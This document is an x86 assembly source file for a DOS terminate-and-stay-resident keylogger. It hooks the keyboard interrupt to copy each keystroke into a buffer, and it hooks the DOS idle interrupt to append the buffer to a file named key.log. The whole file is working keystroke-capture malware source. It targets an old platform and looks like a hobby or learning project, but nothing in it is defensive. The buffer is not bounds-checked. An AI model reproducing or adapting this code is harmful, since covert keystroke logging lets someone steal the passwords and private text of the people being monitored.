locals @@
.model tiny

.code
org 100h

Start:
            mov ah, 35h
            mov al, 09h
            int 21h
            mov word ptr sysHandler09, bx
            mov word ptr sysHandler09 + 2, es

            mov ah, 25h
            mov al, 09h
            mov dx, offset NewKeyboardInt
            int 21h

            mov ah, 35h
            mov al, 28h
            int 21h
            mov word ptr sysHandler28, bx
            mov word ptr sysHandler28 + 2, es

            mov ah, 25h
            mov al, 28h
            mov dx, offset clearFileWrite
            int 21h

            mov ax, 3100h
            mov dx, offset EndInt
            shr dx, 4
            inc dx
            int 21h

;=============================================================
;Keyboard interrupt
;Get symbol
;=============================================================
NewKeyboardInt proc
            pushf
            call cs:sysHandler09
            push ax bx cx di es

            mov ah, 01h             ;read symbol
            int 16h

            jz @@skip               ;skip, if no symbol

            mov bx, offset buffer
            mov cx, cs:[bufferPos] 
            add bx, cx
            mov cs:[bx], al           
            inc cs:[bufferPos]

@@skip:
            in al, 61h
            mov ah, al
            or al, 80h
            out 61h, al
            xchg ah, al
            out 61h, al

            mov al, 20h
            out 20h, al

            pop es di cx bx ax
            iret
            endp

;=====================================================
;int 28h 
;write file
;=====================================================
clearFileWrite proc
            pushf
            call cs:sysHandler28
            push ax bx cx dx ds

            cmp bufferPos, 0
            je @@skip

            push cs:[bufferPos]

            mov ax, cs
            mov ds, ax
            
            mov ah, 3dh                 ;open file
            mov al, 1
            mov dx, offset logPath
            int 21h

            mov bx, ax                  ;move handle

            mov ah, 42h                 ;fseek
            mov al, 2
            mov cx, 0
            mov dx, 0
            int 21h

            mov ah, 40h                 ;write file
            mov cx, cs:[bufferPos]
            mov dx, offset buffer
            int 21h

            mov ah, 3eh                 ;close file
            int 21h

            pop ax
            cmp ax, cs:[bufferPos]
            jne @@skip

            mov bufferPos, 0

@@skip:
            pop ds dx cx bx ax
            iret
            endp

.data
sysHandler09  dd ?
sysHandler28  dd ? 
buffer      db 256d dup (0)
bufferPos   dw 0
logPath     db "s:\doc\projects\keyloger\key.log", 0

EndInt:
end Start